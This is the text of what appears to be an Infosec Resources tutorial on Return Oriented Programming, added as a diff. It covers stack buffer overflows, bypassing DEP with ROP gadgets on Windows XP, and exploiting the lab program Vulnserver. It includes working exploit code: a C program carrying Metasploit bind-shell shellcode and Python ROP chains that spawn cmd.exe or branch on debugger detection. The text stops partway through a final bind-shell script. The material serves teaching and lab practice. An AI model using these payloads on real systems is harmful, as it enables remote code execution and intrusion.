@@ -1,0 +1,1080 @@
+
+INFOSECIT SECURITY BOOT CAMPS ENTERPRISE & GOVERNMENT SECURITY SKILL DEVELOPMENT INFOSEC IQSECURITY AWARENESS TECHEXAMSCERTIFICATION EXAM PREP
+ Infosec Resources 
+TOPICS
+CERTIFICATIONS
+CYBERSECURITY CAREERS
+EVENTS
+CONTRIBUTORSABOUT INFOSEC
+
+Return Oriented Programming (ROP) Attacks
+POSTED IN EXPLOIT DEVELOPMENT ON FEBRUARY 9, 2019
+SHARE
+ 
+ Share  
+ Ethical Hacking Training OUR STUDENTS HAVE THE HIGHEST EXAM PASS RATE IN THE INDUSTRY!
+LEARN MORE
+Infosec SkillsWhat's this?
+Outsmart cybercrime with 400+ skill development and certification courses. Start your free trial
+
+According to Wikipedia, “Return-oriented programming (also called “chunk-borrowing à la Krahmer”) is a computer security exploit technique in which the attacker uses control of the call stack to indirectly execute cherry-picked machine instructions or groups of machine instructions immediately prior to the return instruction in subroutines within the existing program code, in a way similar to the execution of a threaded code interpreter.
+
+“Because all the instructions that are executed are from executable memory areas within the original program, this avoids the need for direct code injection, and circumvents most measures that try to prevent the execution of instructions from user-controlled memory.”
+
+Attacking Web Servers
+Learn to strike at your targets’ weak points with this three-video course on attacking web servers.
+Course videos include:
+→ Web Application Hacking
+→ Attacking web servers
+→ SQL injection
+
+Get started
+Interested in learning other skills? Infosec Skills covers topics such as ethical hacking, computer forensics, reverse engineering and more.
+Let start with an introduction to stack buffer overflows.
+
+Basic System Set
+
+1: Windows XP SP2 installed on a machine supporting H/W enabled DEP.
+
+2: Immunity Debugger and Metasploit.
+
+3: TCC compiler or lcc-win compiler.
+
+4: Latest Python installer.
+
+5: Vulnserver(http://grey-corner.blogspot.com/2010/12/introducing-vulnserver.html ) by Stephen Bradshaw.
+
+    6: Some patience.
+
+Stack Buffer Overflows
+There is a memory region called a “stack”. The stack region of the memory is used to temporarily store data related to the current thread or function, for example the local function and stack parameter of the function. Certain processor registers keep track of the stack location i.e stack top and stack base.
+
+These are nothing but memory addresses which determine the address of the stack frame. Two processor registers ESP and EBP are used to track the record of memory address. ESP stand for top stack pointer and EBP for base pointer.
+
+
+
+This is the typical stack layout in the x86 processor. One thing to notice here is that the stack grows from top to bottom, i.e ESP will always be less or equal to EBP. The stack contains local function variables and a special value called a return address, to which the control flow is returned when a function exits. If that particular value on the stack gets overwritten by any means, we can divert the control flow to our shell code that we injected though data input into the program. For example, consider the following C Code:
+
+int VulnFunction(char *p)
+
+{
+
+    char buf[40];
+
+    strcpy(buf, p);
+
+    return 0;
+
+}
+
+An equivalent disassembly of the VulnFunction code would be:
+
+VulnFunction:
+
+    PUSH EBP
+
+    MOV EBP,ESP
+
+    SUB ESP, 28 ; RESERVER 40 BYTES ON STACK FOR
+
+ 
+
+    PUSH [EBP + 28]; address of buf
+
+    CALL strcpy ; vulnerable function
+
+    ADD ESP, 4 ; STACK CLEAREANCE
+
+    ADD ESP, 28; REMOVER BUF FROM
+
+STACK
+
+    POP EBP ; RESTORE OLD EBP
+
+    RET ; POP VALUE FROM STACK AND RETURN TO THAT ADDRESSS
+
+Now if more than 44 bytes are provided to the function, we will be able to overwrite the return address stored on that stack, which is used to control the return of that function code.
+
+Why 44? You may wonder why more than 44 bytes are required to overwrite the return address when the buffer is only 40 bytes. It’s because at the function entry sequence, the EBP (4 bytes) is pushed on to the stack and recovered at the function exit sequence.
+
+
+
+Let’s now experiment by passing 48 bytes to the program “aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb” and see what happens. In the picture you can clearly see that the EIP gets overwritten by the last 4 bytes, ie “bbbb” (hex 62), and the program crashes suddenly after RET instruction is executed.
+
+In conventional attack scenarios we would attack the program by passing junk(44 bytes) + ESP + shellcode. But the problem with that is the address of the ESP always contains some zero bytes e.g. 0012ff4c, strcpy would stop if a null is encountered and will result in incomplete copying of our shell code. We will supply the return address of a special instruction called a trampoline JMP ESP to make it jump to our shell code located on the stack. In the context of our program we will use a trampoline located in ntdll at:
+
+7C941EED JMP ESP
+
+ So now the attack buffer would be something like this:junk(44 bytes) + JMP_ESP + shellcode
+
+We will supply it a TCP bind Shell code generated with from metasploit
+
+/* C program to exploit VulnFunction */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
+
+#define JMP_ESP 0x7C941EED // ntdll.dll JMP ESP
+// metasploit tcp_bin port 4444
+unsigned char buf[] =
+“\x33\xc9\x83\xe9\xaa\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e”
+“\xd7\x6e\xeb\x09\x83\xee\xfc\xe2\xf4\x2b\x86\x62\x09\xd7\x6e”
+“\x8b\x80\x32\x5f\x39\x6d\x5c\x3c\xdb\x82\x85\x62\x60\x5b\xc3”
+“\xe5\x99\x21\xd8\xd9\xa1\x2f\xe6\x91\xda\xc9\x7b\x52\x8a\x75”
+“\xd5\x42\xcb\xc8\x18\x63\xea\xce\x35\x9e\xb9\x5e\x5c\x3c\xfb”
+“\x82\x95\x52\xea\xd9\x5c\x2e\x93\x8c\x17\x1a\xa1\x08\x07\x3e”
+“\x60\x41\xcf\xe5\xb3\x29\xd6\xbd\x08\x35\x9e\xe5\xdf\x82\xd6”
+“\xb8\xda\xf6\xe6\xae\x47\xc8\x18\x63\xea\xce\xef\x8e\x9e\xfd”
+“\xd4\x13\x13\x32\xaa\x4a\x9e\xeb\x8f\xe5\xb3\x2d\xd6\xbd\x8d”
+“\x82\xdb\x25\x60\x51\xcb\x6f\x38\x82\xd3\xe5\xea\xd9\x5e\x2a”
+“\xcf\x2d\x8c\x35\x8a\x50\x8d\x3f\x14\xe9\x8f\x31\xb1\x82\xc5”
+“\x85\x6d\x54\xbf\x5d\xd9\x09\xd7\x06\x9c\x7a\xe5\x31\xbf\x61”
+“\x9b\x19\xcd\x0e\x28\xbb\x53\x99\xd6\x6e\xeb\x20\x13\x3a\xbb”
+“\x61\xfe\xee\x80\x09\x28\xbb\xbb\x59\x87\x3e\xab\x59\x97\x3e”
+“\x83\xe3\xd8\xb1\x0b\xf6\x02\xe7\x2c\x38\x0c\x3d\x83\x0b\xd7”
+“\x7f\xb7\x80\x31\x04\xfb\x5f\x80\x06\x29\xd2\xe0\x09\x14\xdc”
+“\x84\x39\x83\xbe\x3e\x56\x14\xf6\x02\x3d\xb8\x5e\xbf\x1a\x07”
+“\x32\x36\x91\x3e\x5e\x5e\xa9\x83\x7c\xb9\x23\x8a\xf6\x02\x06”
+“\x88\x64\xb3\x6e\x62\xea\x80\x39\xbc\x38\x21\x04\xf9\x50\x81”
+“\x8c\x16\x6f\x10\x2a\xcf\x35\xd6\x6f\x66\x4d\xf3\x7e\x2d\x09”
+“\x93\x3a\xbb\x5f\x81\x38\xad\x5f\x99\x38\xbd\x5a\x81\x06\x92”
+“\xc5\xe8\xe8\x14\xdc\x5e\x8e\xa5\x5f\x91\x91\xdb\x61\xdf\xe9”
+“\xf6\x69\x28\xbb\x50\xf9\x62\xcc\xbd\x61\x71\xfb\x56\x94\x28”
+“\xbb\xd7\x0f\xab\x64\x6b\xf2\x37\x1b\xee\xb2\x90\x7d\x99\x66”
+“\xbd\x6e\xb8\xf6\x02\x6e\xeb\x09”;
+
+char *p = NULL;
+
+char *Parg = NULL;
+
+int VulnFunction(char *p)
+{
+char buf[40];
+strcpy(buf, p);
+return 0;
+}
+
+int main(int argc, char **argv)
+{
+char a[900]; // junk to compensate stack
+char *base = NULL;
+
+p = (int*) malloc( sizeof(buf) + 48);
+
+base = p;
+
+if (p == NULL ) exit(EXIT_FAILURE);
+
+memset(p, 0x44, 44); // Set 44 Bytes Junk
+
+p = p + 44;
+
+*(int*)p = JMP_ESP;
+p = base;
+
+memcpy((p + 48), buf, sizeof(buf));
+
+VulnFunction(p);
+return 0;
+}
+
+After executing we will get a shell at 4444 TCP port.DEP (Data Execution Prevention)
+
+DEP is a technique that was introduced to Windows XP SP2 to protect against buffer overflow attacks. DEP simply restricts the execution memory marked as read/write. Since the stack has been marked with read/write attributes, DEP restricts the execution of our shell code which we place on the stack.
+
+Ret2lib (Return To Library) AttackRather than injecting the shellcode and jumping to it, we can call a certain sub-routine in the address space of the executable. For example, we can fake the stack frame to call the system() C standard library function in msvcrt.dll to execute an arbitrary command and we can even chain multiple functions together. That way we can bypass DEP by reusing code from the program binary. But one of the main disadvantage of ret2lib is that it lacks in arbitrary computation (truing completeness).
+
+ROP (Return Oriented Proragmming ) Attack
+This type of attack was introduced by Hovav Shacham of Stanford University in his paper “The Geometry of Innocent Flesh on the Bone:Return-into-libc without Function Calls (on the x86).” In the paper he describes “new return-into-libc techniques that allow arbitrary computation (and that are not, therefore, straight-line limited) and that do not require calling any functions whatsoever“.
+
+That means this type of attack is able to perform arbitrary computation without the necessary use of library functions by reusing code chunks which he calls GADGETS. Gadgets are a small group of instructions ending with a x86 RET instruction. For example, mov eax, 10 ; ret is a gadget which allows us to set eax to 10 (decimal). These gadgets can be chained together to make them work as a simple unit to perform arbitray computations. For example, we can chain three gadgets together to perform addition on them:
+
+    pop eax; ret
+
+    pop ebx ret;
+
+    add eax, ebx; ret
+
+The following chain of gadgets allows us to set two processor registers and them perform arithmetic addition on them:
+
+ROP is not limited to only calculations. We can also perform code branching and check for conditions (equal, less and greater ) on the given data.
+
+ROP Attacks (Loading and Storing Data)
+
+There are certain gadgets that allows us to store and load data from one place to another. Modes of transfer include:
+
+1: register to register
+
+2: register to memory
+
+3:memory to register
+
+Register to Register
+
+The gadgets related to reg to reg copying are:
+
+mov eax, ebx
+
+mov ecx, eax
+
+etc.
+
+Register to Memory
+
+A search in Immunity Debugger will yield the following results and even more:
+
+7C828B39 MOV ECX,DWORD PTR DS:[ECX] C:\WINDOWS\system32\kernel32.dll
+
+7C828BF9 MOV EDX,DWORD PTR DS:[ECX] C:\WINDOWS\system32\kernel32.dll
+
+7C828C2A MOV EDX,DWORD PTR DS:[EAX] C:\WINDOWS\system32\kernel32.dll
+
+7C828CC3 MOV ESI,DWORD PTR DS:[EBX] C:\WINDOWS\system32\kernel32.dll
+
+7C828D26 MOV EDX,DWORD PTR DS:[ECX] C:\WINDOWS\system32\kernel32.dll
+
+7C828D4C MOV EDX,DWORD PTR DS:[EAX] C:\WINDOWS\system32\kernel32.dll
+
+7C828D70 MOV EDX,DWORD PTR DS:[ECX] C:\WINDOWS\system32\kernel32.dll
+
+7C828DAB MOV EAX,DWORD PTR DS:[EAX] C:\WINDOWS\system32\kernel32.dll
+
+7C828DB1 MOV EDX,DWORD PTR DS:[ECX] C:\WINDOWS\system32\kernel32.dll
+
+7C828E77 MOV EAX,DWORD PTR DS:[ESI] C:\WINDOWS\system32\kernel32.dll
+
+7C8290AC MOV EAX,DWORD PTR DS:[ECX] C:\WINDOWS\system32\kernel32.dll
+
+
+
+                    
+
+Memory to Register
+To transfer values from the stack to a register, we have gadgets like pop eax; ret ;pop ebx;ret
+
+This gadget pops a value from the stack and stores it in a processor register.
+
+We also have gadgets like:
+
+7C801118 MOV DWORD PTR DS:[ESI],EAX C:\WINDOWS\system32\kernel32.dll
+
+7C80168A MOV DWORD PTR DS:[EAX],ECX C:\WINDOWS\system32\kernel32.dll
+
+7C8016D9 MOV DWORD PTR DS:[EAX],ECX C:\WINDOWS\system32\kernel32.dll
+
+7C801728 MOV DWORD PTR DS:[EAX],EBX C:\WINDOWS\system32\kernel32.dll
+
+7C801761 MOV DWORD PTR DS:[ECX],EDX C:\WINDOWS\system32\kernel32.dll
+
+7C8017A2 MOV DWORD PTR DS:[EAX],ECX C:\WINDOWS\system32\kernel32.dll
+
+7C801800 MOV DWORD PTR DS:[ECX],EDX C:\WINDOWS\system32\kernel32.dll
+
+7C801823 MOV DWORD PTR DS:[ECX],EBX C:\WINDOWS\system32\kernel32.dll
+
+7C80188E MOV DWORD PTR DS:[ECX],EAX C:\WINDOWS\system32\kernel32.dll
+
+7C8018E2 MOV DWORD PTR DS:[EAX],EBX C:\WINDOWS\system32\kernel32.dll
+
+7C801957 MOV DWORD PTR DS:[EDX],ECX C:\WINDOWS\system32\kernel32.dll
+
+7C801963 MOV DWORD PTR DS:[ESI],EBX C:\WINDOWS\system32\kernel32.dll
+
+7C8019CC MOV DWORD PTR DS:[EAX],ECX C:\WINDOWS\system32\kernel32.dll
+
+7C8019F7 MOV DWORD PTR DS:[EAX],EBX C:\WINDOWS\system32\kernel32.dll
+
+7C801F22 MOV DWORD PTR DS:[EDX],EAX C:\WINDOWS\system32\kernel32.dll
+
+7C801F30 MOV DWORD PTR DS:[EAX],ECX C:\WINDOWS\system32\kernel32.dll
+
+7C802040 MOV DWORD PTR DS:[EAX],EDI C:\WINDOWS\system32\kernel32.dll
+
+7C8021FC MOV DWORD PTR DS:[ECX],EDX C:\WINDOWS\system32\kernel32.dll
+
+7C8022D8 MOV DWORD PTR DS:[EAX],ECX C:\WINDOWS\system32\kernel32.dll
+
+7C80231F MOV DWORD PTR DS:[ECX],EDX C:\WINDOWS\system32\kernel32.dll
+
+7C80248B MOV DWORD PTR DS:[ECX],EAX C:\WINDOWS\system32\kernel32.dll
+
+7C802497 MOV DWORD PTR DS:[ECX],EAX C:\WINDOWS\system32\kernel32.dll
+
+The gadget at 0x7C802497 kernel32.dll MOV DWORD PTR DS:[ECX],EAX; ret, moves the value of EAX to a memory location pointed by ECX.
+
+ROP Gadgets (arithmetic operations)
+
+The x86 primitive instructions related to arithmetic are ADD, SUB, MUL, DIV XOR, rotates and shifts etc., and we can search gadgets related to those operations.
+
+Addition:
+
+7C95CE86 ADD ECX,EBP C:\WINDOWS\system32\ntdll.dll
+
+7C96CCC0 ADD ECX,EBP C:\WINDOWS\system32\ntdll.dll
+
+7C9761FB ADD ECX,ECX C:\WINDOWS\system32\ntdll.dll
+
+7C9770F0 ADD EAX,EBP C:\WINDOWS\system32\ntdll.dll
+
+7CA29036 ADD ESI,ESI C:\WINDOWS\system32\SHELL32.dll
+
+7CA367A6 ADD EAX,EBP C:\WINDOWS\system32\SHELL32.dll
+
+7CABF312 ADD EDI,EDI C:\WINDOWS\system32\SHELL32.dll
+
+7CAE0091 ADD EAX,EBP C:\WINDOWS\system32\SHELL32.dll
+
+7CB8C82F ADD EBX,EBP C:\WINDOWS\system32\SHELL32.dll
+
+7CB9196F ADD EAX,EBP C:\WINDOWS\system32\SHELL32.dll
+
+7CB9B4EA ADD EBX,EAX C:\WINDOWS\system32\SHELL32.dll
+
+7CBA519A ADD EBX,EAX C:\WINDOWS\system32\SHELL32.dll
+
+ 
+
+ 
+
+Similarly, we have subtraction, multiplication and division. E.g.:
+
+7C902AF5 SUB EAX,ECX C:\WINDOWS\system32\ntdll.dll
+
+7C902AFF SUB EAX,ECX C:\WINDOWS\system32\ntdll.dll
+
+7C902B09 SUB EAX,ECX C:\WINDOWS\system32\ntdll.dll
+
+7C902B13 SUB EAX,ECX C:\WINDOWS\system32\ntdll.dll
+
+Handling NULL Bytes in a ROP payloadA ROP payload contains addresses or parameters to a system function (in case we are faking the stack frame of particular function). There is a high probability that a certain parameter of a system function or an address of a ROP gadget might contain one or many NULL bytes and they might be categorised as bad chars in the vulnerable function, eg. in case of strcpy, it stops copying the buffer as soon as a NULL (0x00) byte is encountered. If we go on without taking the null byte handling into account, our ROP payload will be incorrectly copied.
+
+Now, let us consider an example here: You have a hypothetical system function as FunctionX which takes two arguments x and y, in which y has to be necessarily 0 or null in order to work.
+
+Void FunctionX(DWORD x, DWORD y)
+
+{
+
+if (y == NULL)
+
+{
+
+…..
+
+…..
+
+…..
+
+}
+
+exit(-1);
+
+}
+
+The stack frame of FunctionX will become like this.
+
+As we can see on the stack frame, it’s necessary that we place a null word as the second parameter to FunctionX, so how do we handle null bytes?
+
+There is a well known mathematical axiom:
+
+Let there be two variables A and B,
+
+we know A XOR B = z(say)
+
+now A XOR Z = B also B XOR Z = A
+
+let A = 0x00000000
+
+let B = 0xffffffff;
+
+A XOR B = 0xffffffff (z)
+
+Now if we want to convert it back into A, we XOR it back with B(mask)
+
+Z XOR B = 0x00000000
+
+We will use the XOR gadget combined with Load and Store gadgets to store the value back on the stack.
+
+To demonstrate this technique, we will exploit a buffer overflow in Vulnserver (see http://grey-corner.blogspot.com/2010/12/introducing-vulnserver.html by Stephen Bradshaw).
+
+There exists a buffer overflow in the server when processing TRUN messages from the client.
+
+From vulnserver.c:
+
+else if (strncmp(RecvBuf, “TRUN “, 5) == 0) {
+
+                char *TrunBuf = malloc(3000);
+
+                memset(TrunBuf, 0, 3000);
+
+                for (i = 5; i < RecvBufLen; i++) {
+
+                    if ((char)RecvBuf[i] == ‘.’) {
+
+                        strncpy(TrunBuf, RecvBuf, 3000);
+
+                        Function3(TrunBuf);
+
+                        break;
+
+                    }
+
+                }
+
+The server accepts 3000 bytes after the TRUN message and passes it to Function3, where the buffer overflow takes place.
+
+void Function3(char *Input) {
+
+    char Buffer2S[2000];
+
+    strcpy(Buffer2S, Input);
+
+}
+
+Using pattern_create.rb and pattern_offset.rb from Metasploit, we are able to determine that after 2006 bytes the EIP overwrite takes place.
+
+We will try to demonstrate a ROP payload executing WinExec to execute CMD.EXE using exploit code written in Python.
+
+# WinExec ROP exploit for vulnserver
+
+# (C) 2012 Rashid bhatt
+
+import socket, sys
+
+from struct import pack
+
+target = “127.0.0.1”
+
+port = int(“9999”)
+
+from operator import *
+
+param1 = xor(0x00B6FA60, 0xffffffff) # location of stack parameter
+
+lpCMDline = xor(0x00B6FA68, 0xffffffff) # pointer to string
+
+param2 = xor(0x00B6FA64, 0xffffffff) # location of stack parameter
+
+eip = pack(‘<L’, 0x7C9029AC) # pop edi
+
+eip += pack(‘<L’, 0xffffffff)
+
+eip += pack(‘<L’, 0x7C971980)    #pop ecx
+
+eip += pack(‘<L’, param1)
+
+eip += pack(‘<L’, 0x71AB100C)    #xor ecx, edi
+
+eip += pack(‘<L’, 0x77C14001) # xchg eax, ecx
+
+eip += pack(‘<L’, 0x7C9029AC) # pop edi
+
+eip += pack(‘<L’, 0xffffffff)
+
+eip += pack(‘<L’, 0x7C971980)    #pop ecx
+
+eip += pack(‘<L’, lpCMDline)
+
+eip += pack(‘<L’, 0x71AB100C)    #xor ecx, edi
+
+eip += pack(‘<L’, 0x7C951376) # MOV DWORD PTR DS:[EAX],ECX
+
+## for nCMDShow , we have to make it zero
+
+eip += pack(‘<L’, 0x7C9029AC) # pop edi
+
+eip += pack(‘<L’, 0xffffffff)
+
+eip += pack(‘<L’, 0x7C971980)    #pop ecx
+
+eip += pack(‘<L’, param2)
+
+eip += pack(‘<L’, 0x71AB100C)    #xor ecx, edi
+
+eip += pack(‘<L’, 0x77C14001) # xchg eax, ecx
+
+eip += pack(‘<L’, 0x7C91C91D)    #xor ecx, ecx
+
+eip += pack(‘<L’, 0x7C951376) # MOV DWORD PTR DS:[EAX],ECX
+
+eip += pack(‘<L’, 0x7C86114D)        # call WinExec
+
+eip += pack(‘<L’, 0x77C39E7E ) # ret to msvcrt_Exit ( function chained )
+
+eip += pack(‘<L’,0xdeadbeef) # first param point to stack ( contains a null byte)
+
+eip += pack(‘<L’,0xdeadbeef ) # second param (zero nCMDShow = 0)
+
+eip += “cmd.exe”
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+s.connect((target,port))
+
+s.send(“TRUN .” + “a” * 2006 + eip)
+
+s.recv(1000)
+
+s.close()
+
+
+
+ 
+
+UN-conditional and Conditional jumps in ROP attacks
+In ROP, the ESP keeps track of the next gadget to be executed, therefore by modifying the ESP we can divert or skip the execution of certain gadgets. The following diagram illustrates an infinite loop.
+
+
+
+# Infinite loop ROP payload
+
+# (C) 2012 Rashid Bhatt
+
+import socket, sys
+
+from struct import pack
+
+target = “127.0.0.1”
+
+port = int(“9999”)
+
+from operator import *
+
+esp_loc = xor(0x00B6FA3C, 0xffffffff) # location of DWORD after pop esp gadget on stack
+
+esp_val = xor(0x00B6FA38, 0xffffffff) # esp value
+
+eip = pack(‘<L’, 0x7C9029AC) # pop edi
+
+eip += pack(‘<L’, 0xffffffff)
+
+eip += pack(‘<L’, 0x7C971980)    #pop ecx
+
+eip += pack(‘<L’, esp_loc)
+
+eip += pack(‘<L’, 0x71AB100C)    #xor ecx, edi
+
+eip += pack(‘<L’, 0x77C14001) # xchg eax, ecx
+
+eip += pack(‘<L’, 0x7C9029AC) # pop edi
+
+eip += pack(‘<L’, 0xffffffff)
+
+eip += pack(‘<L’, 0x7C971980)    #pop ecx
+
+eip += pack(‘<L’, esp_val)
+
+eip += pack(‘<L’, 0x71AB100C)    #xor ecx, edi
+
+eip += pack(‘<L’, 0x7C951376) # MOV DWORD PTR DS:[EAX],ECX
+
+eip += pack(‘<L’, 0x7C929BAB) # pop esp
+
+eip += pack(‘<L’, 0xdeadbeef)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+s.connect((target,port))
+
+s.send(“TRUN .” + “a” * 2006 + eip)
+
+s.recv(1000)
+
+s.close()
+
+Conditional jumps in ROP are quite tricky. We have to modify the ESP based on a certain comparison eg < ,> ,== .
+
+ETHICAL HACKING BOOT CAMP — EXAM PASS GUARANTEE
+
+
+Comparing with zero
+We will check if the value is zero or not, and based on the comparison, we will add an offset to the ESP to skip certain gadgets.
+
+wWe need to store two values on the stack:
+
+1: The value to be compared with zero.
+
+2: ESP_DELTA , the value which will be added to the ESP if the condition is satisfied.
+
+The process takes place in the following steps:1: Load the value to be checked in a general purpose register and apply NEG x86 instruction on it.
+
+2: NEG instruction Computes the 2′ complement, and sets the CF as per the operand.
+
+3: If the number is zero, the CF becomes zero, otherwise one.
+
+4: Zero any register by xor reg,reg gadget, and use ADC reg,reg to place the CF in it.
+
+5: Again use NEG instruction to compute the 2’s complement on the same register. The register would now either contain a single 1 bit or all zeros, based on the CF from the previous operation.
+
+6: 2’s complement will transform it to all zeros if CF was 0 or all 1 if CF was 1.
+
+7: Perform Logical AND of ESP_DELTA and the result.
+
+8: Now, based on the CF we will either get ESP_DELTA or zero.
+
+8: Add the result to the ESP.
+
+To demonstrate this technique, we will use the IsDebuggerPresent(void) function to check if the process is being debugged or not, and if not, we will proceed to execute CMD.exe using the earlier ROP payload:
+
+# Conditional ROP payload
+
+# (c) 2012 Rashid Bhatt
+
+import socket, sys
+
+from struct import pack
+
+target = “127.0.0.1”
+
+port = int(“9999”)
+
+from operator import *
+
+esp_delta_loc = xor(0x00B6FA88 , 0xffffffff) # location of esp_delta on stack
+
+esp_delta_value = xor(0x200, 0xffffffff) # value to be added to stack
+
+param1 = xor(0x00B6FA98, 0xffffffff)
+
+param1_val = xor(0x00, 0xffffffff)
+
+# handling zero bytes for ESP_DELTA
+
+eip = pack(‘<L’, 0x7C9029AC) # pop edi
+
+eip += pack(‘<L’, 0xffffffff)
+
+eip += pack(‘<L’, 0x7C971980)    #pop ecx
+
+eip += pack(‘<L’, esp_delta_loc)
+
+eip += pack(‘<L’, 0x71AB100C)    #xor ecx, edi
+
+eip += pack(‘<L’, 0x77C14001) # xchg eax, ecx
+
+eip += pack(‘<L’, 0x7C9029AC) # pop edi
+
+eip += pack(‘<L’, 0xffffffff)
+
+eip += pack(‘<L’, 0x7C971980)    #pop ecx
+
+eip += pack(‘<L’, esp_delta_value)
+
+eip += pack(‘<L’, 0x71AB100C)    #xor ecx, edi
+
+eip += pack(‘<L’, 0x7C951376) # MOV DWORD PTR DS:[EAX],ECX
+
+# FOR POP EBX ; EBX = 0 ( unfortunately no gadget was available for xor ebx,ebx)
+
+eip += pack(‘<L’, 0x7C9029AC) # pop edi
+
+eip += pack(‘<L’, 0xffffffff)
+
+eip += pack(‘<L’, 0x7C971980)    #pop ecx
+
+eip += pack(‘<L’, param1)
+
+eip += pack(‘<L’, 0x71AB100C)    #xor ecx, edi
+
+eip += pack(‘<L’, 0x77C14001) # xchg eax, ecx
+
+eip += pack(‘<L’, 0x7C9029AC) # pop edi
+
+eip += pack(‘<L’, 0xffffffff)
+
+eip += pack(‘<L’, 0x7C971980)    #pop ecx
+
+eip += pack(‘<L’, param1_val)
+
+eip += pack(‘<L’, 0x71AB100C)    #xor ecx, edi
+
+eip += pack(‘<L’, 0x7C951376) # MOV DWORD PTR DS:[EAX],ECX
+
+eip += pack(‘<L’, 0x7C812E03) # isdebuggerpresent()
+
+eip += pack(‘<L’, 0x77E2233D)    #xor esi,esi
+
+eip += pack(‘<L’, 0x77D74960) # NEG eax
+
+eip += pack(‘<L’, 0x71A77D0B) # adc esi,esi
+
+eip += pack(‘<L’, 0x77C39F8F) # mov eax,esi (with side effects of popping a value from stack)
+
+eip += pack(‘<L’, 0xdeadbeef) # junk
+
+eip += pack(‘<L’, 0x77D74960)    #neg eax
+
+eip += pack(‘<L’, 0x7C90ECEA) # pop edi
+
+eip += pack(‘<L’, 0xbadb00b) # ESP_DELTA fixed earlier
+
+eip += pack(‘<L’, 0x77C13FFD)    # XCHG EAX, ECX
+
+eip += pack(‘<L’, 0x77C14518 ) # AND EDI,ECX
+
+eip += pack(‘<L’, 0x7C9742C9 ) # pop ebx
+
+eip += pack(‘<L’, 0xbadb00b) # ZERO fixed earlier
+
+eip += pack(‘<L’, 0x77E0C1EE) # xchg eax, edi
+
+eip += pack(‘<L’, 0x7C939D54) # ADD EBX,EAX
+
+eip += pack(‘<L’, 0x7C939C04) # ADD ESP, EBX
+
+# ============================== #
+
+param1 = xor(0x00B6FB00, 0xffffffff) # location of stack parameter
+
+lpCMDline = xor(0x00B6FB08, 0xffffffff) # pointer to string
+
+param2 = xor(0x00B6FB04, 0xffffffff) # location of stack parameter
+
+eip += pack(‘<L’, 0x7C9029AC) # pop edi
+
+eip += pack(‘<L’, 0xffffffff)
+
+eip += pack(‘<L’, 0x7C971980)    #pop ecx
+
+eip += pack(‘<L’, param1)
+
+eip += pack(‘<L’, 0x71AB100C)    #xor ecx, edi
+
+eip += pack(‘<L’, 0x77C14001) # xchg eax, ecx
+
+eip += pack(‘<L’, 0x7C9029AC) # pop edi
+
+eip += pack(‘<L’, 0xffffffff)
+
+eip += pack(‘<L’, 0x7C971980)    #pop ecx
+
+eip += pack(‘<L’, lpCMDline)
+
+eip += pack(‘<L’, 0x71AB100C)    #xor ecx, edi
+
+eip += pack(‘<L’, 0x7C951376) # MOV DWORD PTR DS:[EAX],ECX
+
+## for nCMDShow , we have to make it zero
+
+eip += pack(‘<L’, 0x7C9029AC) # pop edi
+
+eip += pack(‘<L’, 0xffffffff)
+
+eip += pack(‘<L’, 0x7C971980)    #pop ecx
+
+eip += pack(‘<L’, param2)
+
+eip += pack(‘<L’, 0x71AB100C)    #xor ecx, edi
+
+eip += pack(‘<L’, 0x77C14001) # xchg eax, ecx
+
+eip += pack(‘<L’, 0x7C91C91D)    #xor ecx, ecx
+
+eip += pack(‘<L’, 0x7C951376) # MOV DWORD PTR DS:[EAX],ECX
+
+eip += pack(‘<L’, 0x7C86114D)        # call WinExec
+
+eip += pack(‘<L’, 0x77C39E7E ) # ret to msvcrt_Exit ( function chained )
+
+eip += pack(‘<L’,0xdeadbeef) # first param point to stack ( contains a null byte)
+
+eip += pack(‘<L’,0xdeadbeef ) # second param (zero nCMDShow = 0)
+
+eip += “cmd.exe”
+
+# ========================================= #
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+s.connect((target,port))
+
+s.send(“TRUN .” + “a” * 2006 + eip)
+
+s.recv(1000)
+
+s.close()
+
+Now, if we run the exploit without debugging the process, we will proceed to the execution of CMD.exe, but if the server is being debugged, the process will crash because that time the ROP payload for CMD.EXE will be skipped. We can verify this by debugging the server and then setting a break point at 7C939C04 ADD ESP, EBX gadget.Hit the Breakpoint at 7C939C04:
+
+7C939C04 01DC ADD ESP,EBX ; offset being added to esp
+
+7C939C06 05 9CEE977C ADD EAX,ntdll.7C97EE9C
+
+7C939C0B C3 RETN
+
+EAX FFFFFFFF
+
+ECX FFFFFFFF
+
+EDX 00657865
+
+EBX 00000200 << 200 (hex) offset added when process in being debugged
+
+ESP 00B6FAA8
+
+EBP 61616161
+
+ESI DEADBEEF
+
+EDI 00000000
+
+EIP 7C939C04 ntdll.7C939C04
+
+
+Comparing two values
+A similar strategy is used to check if two values are equal to, less than, or greater than each other.
+
+A SUB instruction will subtract two values to be checked for equality; the SUB instruction sets the CF if the destination operand is greater. The CF would get updated if the values are not same, and then later apply the same logic of checking for zero.
+
+Putting it all Together
+We will now write a ROP exploit for Vulnserver to bind it to port 4444 TCP. To achieve that we will remark the stack memory with an executable permission using VirtualProtect Function and then we will jump to our shellcode located on the stack.
+
+# (c) 2012 Rashid Bhatt
+
+import socket, sys
+
+from struct import pack
+
+# tcp/ip bind 444 shellcode
+
